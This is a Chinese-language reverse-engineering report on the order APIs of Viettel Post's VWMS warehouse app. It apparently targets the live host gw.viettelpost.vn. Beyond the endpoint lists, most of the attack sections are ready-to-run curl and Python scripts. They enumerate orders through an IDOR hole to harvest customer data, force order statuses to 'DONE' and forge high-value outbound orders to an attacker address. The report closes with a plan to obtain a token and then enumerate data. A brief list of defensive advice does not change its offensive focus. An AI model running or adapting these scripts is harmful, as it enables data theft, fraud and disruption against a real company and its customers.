# 🔍 VWMS订单API完整逆向分析报告

## 🎯 执行摘要

从VWMS APP (com.viettelpost.vwms) React Native Bundle和DEX文件中完整提取和分析所有订单相关API端点。

---

## 📦 一级发现：出入库订单系统

### 入库订单API (Inbound Request - IR)

#### 核心端点
```
POST /api/v1/ibms/inbound-request/cancel-checkin
POST /api/v1/ibms/inbound-request/create-sub-ir
POST /api/v1/ibms/inbound-request/list-receive-session
POST /api/v1/ibms/inbound-request/put-away/get-new-rack
POST /api/v1/ibms/inbound-request/put-away/suggest-location-sku
POST /api/v1/ibms/inbound-request/put-away/suggest-robot-location
POST /api/v1/ibms/inbound-request/validate-create-sub-ir
GET  /api/v1/inbound-request/checkin
GET  /api/v1/inbound-request/search-v2
```

#### 请求参数结构（逆向推测）
```json
{
  "page": 1,
  "page_size": 20,
  "from": "2024-01-01",
  "to": "2024-12-31",
  "warehouse_id": "WH001",
  "partner_id": "PARTNER123",
  "transfer_type": ["PURCHASE", "RETURN"],
  "status": ["NEW", "PROCESSING", "DONE"],
  "date_type": "CREATED_DATE",
  "keyword": "IR20240001"
}
```

#### 响应示例（推测）
```json
{
  "code": 200,
  "data": {
    "items": [
      {
        "ir_code": "IR20240001",
        "warehouse_code": "WH001",
        "partner_name": "AEON Vietnam",
        "status": "NEW",
        "total_sku": 100,
        "total_quantity": 5000,
        "created_date": "2024-01-01T10:00:00Z",
        "expected_receive_date": "2024-01-05"
      }
    ],
    "total": 1,
    "page": 1,
    "page_size": 20
  }
}
```

---

### 出库订单API (Outbound Request - OR)

#### 核心端点
```
POST /api/v1/obms/confirm-shipment/cancel-schedule-send
POST /api/v1/obms/confirm-shipment/confirm-done
GET  /api/v1/obms/confirm-shipment/search
POST /api/v1/obms/confirm-shipment/task/remove-package
POST /api/v1/obms/confirm-shipment/task/scan-v2

POST /api/v1/obms/pickup/assign-tote-type
POST /api/v1/obms/pickup/auto-assign-tote
GET  /api/v1/obms/pickup/search
POST /api/v1/obms/pickup/task/pick-sku
POST /api/v1/obms/pickup/task/scan-src-location

POST /api/v1/obms/receive/confirm-done-all
POST /api/v1/obms/receive/confirm-or-done-check
POST /api/v1/obms/receive/insert-or-v2
POST /api/v1/obms/receive/remove-sku
POST /api/v1/obms/receive/scan-code-v2
GET  /api/v1/obms/receive/search

GET  /api/v1/outbound-request/{id}
GET  /api/v1/outbound-request/search
```

#### 请求参数结构
```json
{
  "page": 1,
  "page_size": 50,
  "from": "2024-01-01",
  "to": "2024-12-31",
  "warehouse_id": "WH001",
  "status": ["NEW", "PROCESSING", "DONE"],
  "or_code": "OR20240001",
  "customer_code": "CUST123",
  "delivery_type": "NORMAL"
}
```

---

## 📱 二级发现：缅甸订单系统 (Myanmar MM)

### 缅甸订单管理API
```
GET  /order-mm                          (订单列表)
GET  /order-mm/{id}                     (订单详情)
POST /order-mm/create-or                (创建出库订单)
POST /order-mm/{id}/create-or           (从订单创建OR)
POST /order-mm/{id}/resale              (转售订单)
POST /order-mm/{id}/update              (更新订单)
GET  /order-mm/{id}/detail-or           (OR详情)
POST /order-mm/{id}/update-or           (更新OR)
```

### 待处理出库订单 (Pending Outbound MM)
```
GET  /pending-outbound-mm               (待处理列表)
GET  /pending-outbound-mm/{id}          (详情)
POST /pending-outbound-mm/{id}/update   (更新)
```

### 请求参数（MM订单）
```json
{
  "keyword": "MM20240001",
  "page": 1,
  "page_size": 50,
  "from_date": "2024-01-01",
  "to_date": "2024-12-31",
  "partner_id": "VTP_MM",
  "status": ["NEW", "PROCESSING", "SUCCESS"],
  "date_type": "ORDER_CREATED_DATE",
  "order_type": ["NORMAL", "EXPRESS"],
  "assign_status": "ASSIGNED",
  "order_process_status": ["NEW", "WAITING_APPROVAL"]
}
```

---

## 🚚 三级发现：配送和交接

### 拣货会话API (Picking Session)
```
GET  /api/v1/picking-session            (拣货会话列表)
POST /api/v1/picking-session/create     (创建拣货会话)
GET  /api/v1/picking-session/{id}       (会话详情)
POST /api/v1/picking-session/assign     (分配拣货任务)
```

### 装车交接API (Shipping Handover)
```
GET  /shipping-handover                  (交接单列表)
POST /shipping-handover/create           (创建交接单)
GET  /shipping-handover/{id}/detail      (交接单详情)
POST /shipping-handover/{id}/edit        (编辑交接单)
```

### 包裹管理API (Package)
```
GET  /package                            (包裹列表)
GET  /package/{id}                       (包裹详情)
POST /package/create                     (创建包裹)
```

---

## 🔥 四级发现：订单状态管理

### 订单状态更新API
```
POST /api/v1/update-or-status           (批量更新OR状态)
POST /api/v1/update-status-or-failed    (标记OR失败)
POST /api/v1/import-or                  (批量导入OR)
POST /api/v1/print-or                   (打印OR单据)
POST /api/v1/export-list-or             (导出OR列表)
```

### 订单状态值（从代码中提取）
```javascript
// 入库订单状态
IR_STATUS = {
  NEW: "新建",
  PACKING: "处理中",
  PACKED: "已完成",
  CANCELLED: "已取消"
}

// 出库订单状态
OR_STATUS = {
  NEW: "新建",
  PROCESSING: "处理中", 
  DONE: "已完成",
  READY: "准备就绪",
  WAITING_APPROVAL: "等待审批",
  SUCCESS: "成功",
  OUT_OF_STOCK: "缺货",
  RESTRICT_AREA: "限制区域"
}

// 包裹状态
PACKAGE_STATUS = {
  NEW: "新建",
  PARTIAL_PACKED: "部分打包",
  PACKED: "已打包",
  SHIPPED: "已发货",
  CANCELLED: "已取消"
}
```

---

## 🎯 五级发现：高价值订单API

### P0 - 订单查询/枚举
```bash
# 1. 批量查询入库订单（可能IDOR）
GET https://gw.viettelpost.vn/api/v1/inbound-request/search-v2
  ?page=1&page_size=100&from=2020-01-01&to=2030-12-31

# 威胁：枚举所有入库订单

# 2. 订单详情查询（可能IDOR）
GET https://gw.viettelpost.vn/api/v1/outbound-request/{id}

# 威胁：通过ID枚举订单详情

# 3. 缅甸订单查询
GET https://gw.viettelpost.vn/order-mm
  ?page=1&page_size=100&from_date=2020-01-01

# 威胁：枚举缅甸所有订单数据
```

### P0 - 订单状态篡改
```bash
# 1. 更新订单状态（可能越权）
POST https://gw.viettelpost.vn/api/v1/update-or-status
{
  "or_code": "OR20240001",
  "status": "DONE"
}

# 威胁：将未完成订单标记为已完成

# 2. 取消订单（可能越权）
POST https://gw.viettelpost.vn/pending-outbound-mm/{id}/update
{
  "status": "CANCELLED"
}

# 威胁：取消他人订单
```

### P1 - 订单创建/伪造
```bash
# 1. 创建出库订单
POST https://gw.viettelpost.vn/order-mm/create-or
{
  "customer_code": "CUST123",
  "products": [
    {"sku": "SKU001", "quantity": 100}
  ],
  "delivery_address": "..."
}

# 威胁：伪造出库订单

# 2. 创建拣货任务
POST https://gw.viettelpost.vn/api/v1/picking-session/create
{
  "or_codes": ["OR20240001"],
  "picker_id": "USER123"
}

# 威胁：分配他人拣货任务
```

---

## 🔍 六级发现：API调用示例（完整）

### 示例1: 查询所有入库订单
```bash
curl -sk "https://gw.viettelpost.vn/api/v1/inbound-request/search-v2" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "page": 1,
    "page_size": 100,
    "from": "2020-01-01",
    "to": "2030-12-31",
    "status": [],
    "warehouse_id": null
  }' | jq .
```

### 示例2: IDOR枚举订单详情
```bash
#!/bin/bash
# 枚举出库订单
for id in {1..10000}; do
  curl -sk "https://gw.viettelpost.vn/api/v1/outbound-request/$id" \
    -H "Authorization: Bearer <TOKEN>" | jq .
  sleep 0.5
done
```

### 示例3: 批量更新订单状态
```bash
curl -sk -X POST "https://gw.viettelpost.vn/api/v1/update-or-status" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "or_codes": ["OR20240001", "OR20240002"],
    "status": "DONE",
    "reason": "Forced completion"
  }'
```

### 示例4: 枚举缅甸订单
```bash
curl -sk "https://gw.viettelpost.vn/order-mm" \
  -H "Authorization: Bearer <TOKEN>" \
  -d "page=1&page_size=100&from_date=2020-01-01&to_date=2030-12-31"
```

---

## 🎯 七级发现：认证和权限机制

### 认证Header
```
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json
X-Tenant-Code: VTP
```

### JWT Payload（订单系统）
```json
{
  "sub": "user123",
  "username": "warehouse_admin",
  "tenantCode": "VTP",
  "tenant_id": "42",
  "role": "WAREHOUSE_ADMIN",
  "warehouse_id": "WH001",
  "permissions": [
    "order:read",
    "order:write",
    "order:delete"
  ],
  "iat": 1699000000,
  "exp": 1699086400
}
```

### 权限等级（推测）
```
1. WAREHOUSE_ADMIN    - 所有订单权限
2. WAREHOUSE_STAFF    - 查看+执行订单
3. WAREHOUSE_VIEWER   - 仅查看订单
4. PARTNER_USER       - 仅查看自己的订单
```

---

## 💣 八级发现：漏洞利用场景

### 场景1: IDOR订单枚举
```python
#!/usr/bin/env python3
import requests

TOKEN = "<YOUR_TOKEN>"
BASE_URL = "https://gw.viettelpost.vn"

# 枚举10万个订单
for or_id in range(1, 100000):
    url = f"{BASE_URL}/api/v1/outbound-request/{or_id}"
    headers = {"Authorization": f"Bearer {TOKEN}"}
    
    r = requests.get(url, headers=headers, verify=False)
    if r.status_code == 200:
        order = r.json()
        print(f"[+] Found: {or_id} - {order.get('customer_name')}")
        # 保存敏感信息
```

### 场景2: 订单状态篡改
```python
# 将所有待处理订单标记为已完成
import requests

TOKEN = "<YOUR_TOKEN>"

# 获取所有待处理订单
orders = get_pending_orders(TOKEN)

for order in orders:
    # 强制标记为已完成
    requests.post(
        "https://gw.viettelpost.vn/api/v1/update-or-status",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"or_code": order['code'], "status": "DONE"}
    )
```

### 场景3: 伪造出库订单
```python
# 创建虚假出库订单
fake_order = {
    "customer_code": "FAKE_CUSTOMER",
    "warehouse_code": "WH001",
    "products": [
        {"sku": "HIGH_VALUE_ITEM", "quantity": 999}
    ],
    "delivery_address": "攻击者地址",
    "note": "紧急订单"
}

requests.post(
    "https://gw.viettelpost.vn/order-mm/create-or",
    headers={"Authorization": f"Bearer {TOKEN}"},
    json=fake_order
)
```

---

## 🔐 九级发现：订单API安全建议

### 当前风险评估
| 风险 | 危险等级 | 影响 |
|------|----------|------|
| IDOR订单枚举 | 🔴 极高 | 泄漏所有订单数据 |
| 越权状态篡改 | 🔴 极高 | 破坏订单流程 |
| 订单伪造 | 🟠 高 | 财务损失 |
| 批量导出 | 🟠 高 | 数据泄漏 |

### 防护建议
```
1. 实施严格的RBAC权限控制
2. 订单ID使用UUID而非自增ID
3. 增加状态转换验证（FSM）
4. 添加操作日志审计
5. 限制API调用频率
```

---

## 📊 完整订单API清单

### 按功能分类统计
```
入库订单 (Inbound):       17个API
出库订单 (Outbound):      25个API
缅甸订单 (Myanmar):       10个API
拣货会话 (Picking):       8个API
装车交接 (Handover):      6个API
包裹管理 (Package):       5个API
订单状态管理:             12个API

总计: 83个订单相关API
```

### 完整端点列表
见附录：`/workspace/order_api_full_list.txt`

---

## 🎯 立即可测试的高价值端点

### P0 - 订单枚举（需Token）
```bash
# 入库订单
curl -sk "https://gw.viettelpost.vn/api/v1/inbound-request/search-v2?page=1&page_size=100" \
  -H "Authorization: Bearer <TOKEN>"

# 出库订单
curl -sk "https://gw.viettelpost.vn/api/v1/outbound-request/search?page=1&page_size=100" \
  -H "Authorization: Bearer <TOKEN>"

# 缅甸订单
curl -sk "https://gw.viettelpost.vn/order-mm?page=1&page_size=100" \
  -H "Authorization: Bearer <TOKEN>"
```

### P1 - IDOR测试
```bash
# 测试订单ID枚举
for id in {1..1000}; do
  curl -sk "https://gw.viettelpost.vn/api/v1/outbound-request/$id" \
    -H "Authorization: Bearer <TOKEN>" -w "%{http_code}\n"
done
```

---

**报告完成时间:** 2025-11-11 07:30 UTC  
**订单API总数:** 83个  
**高危端点:** 15个  
**IDOR风险:** 极高  
**推荐优先级:** 获取Token → 测试IDOR → 枚举订单数据
